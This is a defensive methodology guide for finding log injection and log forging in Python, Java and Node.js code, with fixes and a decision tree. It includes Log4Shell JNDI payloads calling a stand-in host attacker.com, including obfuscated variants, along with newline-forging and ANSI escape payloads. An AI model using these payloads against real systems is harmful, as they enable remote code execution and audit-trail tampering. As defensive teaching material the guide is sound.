# Log Injection / Log Forging Detection

## Methodology

### Step 1: Identify Logging Frameworks and Log Sinks

**Python (logging / loguru / structlog):**
```python
logger.info(f"User {username} logged in")         # Injection target
logger.warning("Failed login for %s", username)    # Injection target
# Structured (safer):
structlog.get_logger().info("login", username=username)
```

**Java (Log4j / SLF4J / Logback):**
```java
log.info("User {} logged in", username);           // Injection target
log.error("Error: " + userInput);                  // Injection target
// CRITICAL: Log4j JNDI lookup (CVE-2021-44228)
log.info("User-Agent: {}", request.getHeader("User-Agent"));
```

**Node.js (winston / pino / console):**
```javascript
logger.info(`User ${username} logged in`);         // Injection target
// Structured (safer):
pino().info({ username }, 'User logged in');
```

### Step 2: Identify Log Injection Vectors

**Newline injection (log forging):**
```
# Input: admin\n[2024-01-15 10:00:00] INFO Login successful for admin
# Creates fake log entry indistinguishable from real ones
```

**ANSI escape sequences:** `\x1b[2J` (clear screen), `\x1b[31mFAKE ALERT\x1b[0m` (red text)

**Log4j JNDI lookup (Log4Shell):**
```
${jndi:ldap://attacker.com/exploit}
# Obfuscated: ${${lower:j}ndi:ldap://attacker.com/x}
# Obfuscated: ${j${::-n}di:ldap://attacker.com/x}
```

**Format string injection:**
```python
logger.info(user_input)  # If input = "%(asctime)s" -- leaks log format
```

### Step 3: Trace User Input to Log Statements

Common sources: form fields, query params, HTTP headers (User-Agent, Referer), exception messages containing user input.

```python
username = request.form['username']
logger.info(f"Login attempt for {username}")       # Direct
user_agent = request.headers.get('User-Agent')     # Fully attacker-controlled
logger.debug(f"User-Agent: {user_agent}")
```

### Step 4: Detect Log4Shell (JNDI Lookup) Vulnerability

```xml
<!-- VULNERABLE: Log4j 2.0 through 2.16.0 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
<!-- SAFE: 2.17.1+ -->
```

Mitigations: `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` (partial), `-Dlog4j2.formatMsgNoLookups=true`, removing `JndiLookup.class` from jar.

### Step 5: Check for Structured Logging

Structured logging (JSON) escapes newlines in field values, preventing log forging.

```python
# VULNERABLE: plain text
logging.basicConfig(format='%(asctime)s %(message)s')
logger.info(f"User {username} action")  # Newlines create fake entries

# SAFER: structured JSON
structlog.configure(processors=[structlog.processors.JSONRenderer()])
log.info("user_action", username=username)
# Output: {"event": "user_action", "username": "admin\nfake"}
```

```javascript
// SAFER: pino (JSON by default)
pino().info({ username }, 'User action');
// VULNERABLE: winston with simple format
winston.createLogger({ format: winston.format.simple() });
```

### Step 6: Evaluate Log Consumers

| Destination | Risk |
|---|---|
| Terminal | ANSI escape attacks, visual spoofing |
| Plain text files | Log forging, evidence tampering |
| SIEM (Splunk, ELK) | Query injection, false alerts |
| Compliance/audit | Evidence tampering, regulatory violation |

## Decision Tree

```
User input reaches log statement?
|
+-- NO --> SAFE
|
+-- YES
    |
    Log4j 2.x version < 2.17.1?
    +-- YES --> VULNERABLE (Critical) -- Log4Shell RCE
    +-- NO
        |
        Structured logging (JSON output)?
        |
        +-- YES (input in field values) --> HARDENED (Low)
        +-- NO (plain text)
            |
            Newline/CRLF sanitization applied?
            +-- YES --> HARDENED (Low)
            +-- NO
                |
                Logs used for security/audit?
                +-- YES --> VULNERABLE (High)
                +-- NO  --> VULNERABLE (Medium)
```

## Real-World Examples

### Example 1: Log4Shell (CVE-2021-44228)

```java
@PostMapping("/api/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    log.info("Login attempt for user: {}", request.getUsername());
    User user = userService.authenticate(request.getUsername(), request.getPassword());
    if (user != null) return ResponseEntity.ok(generateToken(user));
    log.warn("Failed login for: {}", request.getUsername());
    return ResponseEntity.status(401).body("Invalid credentials");
}
```

**Why vulnerable:** Log4j 2.x evaluates JNDI lookups in log messages. Attacker submits `username=${jndi:ldap://attacker.com:1389/Exploit}`, triggering remote class loading and RCE.

**Impact:** Unauthenticated RCE. One of the most severe vulnerabilities in computing history.

**Fix:**
```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.21.1</version>
</dependency>
```

### Example 2: Audit Trail Tampering in Python

```python
@app.route('/transfer', methods=['POST'])
def transfer_funds():
    recipient = request.form['recipient']
    amount = request.form['amount']
    logger.info(f"Fund transfer: {session['username']} -> {recipient}, ${amount}")
    if process_transfer(session['username'], recipient, float(amount)):
        logger.info(f"Transfer successful: {session['username']} -> {recipient}, ${amount}")
```

**Why vulnerable:** Attacker submits `recipient=alice\n2024-01-15 10:00:00 INFO Transfer successful: admin -> attacker, $1000000`. Fake log entries appear to show approved large transfers.

**Impact:** Audit trail tampering. Deceives analysts, undermines SOX/PCI-DSS compliance.

**Fix:**
```python
def sanitize_for_log(value):
    return re.sub(r'[\r\n]', ' ', re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', str(value)))

recipient = sanitize_for_log(request.form['recipient'])
# Better: use structured logging
logger.info("fund_transfer", extra={"sender": sender, "recipient": recipient})
```

### Example 3: ANSI Escape Injection in Node.js

```javascript
const logger = winston.createLogger({
    format: winston.format.combine(winston.format.colorize(), winston.format.simple()),
    transports: [new winston.transports.Console(), new winston.transports.File({filename: 'app.log'})]
});

app.post('/api/feedback', (req, res) => {
    logger.info(`Feedback from ${req.body.name}: ${req.body.message}`);
});
```

**Why vulnerable:** Attacker submits `name=\x1b[2J\x1b[H\x1b[31mCRITICAL: Database breach\x1b[0m`. ANSI sequences clear terminal and display fake red alert.

**Impact:** Operational deception. Can exploit terminal emulator vulnerabilities.

**Fix:**
```javascript
function stripAnsi(str) {
    return str.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '').replace(/[\r\n\x00-\x1f\x7f]/g, '');
}
const logger = winston.createLogger({
    format: winston.format.combine(sanitizeFormat(), winston.format.json())
});
```

## Common False Positive Patterns

1. **Structured JSON logging** -- structlog, pino, winston JSON format auto-escape newlines in field values.

2. **Server-generated identifiers in logs** -- UUIDs, auto-increment IDs, timestamps are not user-controllable.

3. **Hardcoded log messages** -- `logger.info("Application started")` has no injection surface.

4. **Web server access logs** -- Apache/Nginx typically handle encoding of special characters.

5. **Validated input before logging** -- Admin endpoints with enum/numeric-only fields validated before logging.

6. **Python %s placeholders** -- `logger.info("User %s", username)` is injectable for newlines but not a format string vulnerability.

7. **Test logging** -- `assertLogs`/`caplog` in tests are not production surfaces.
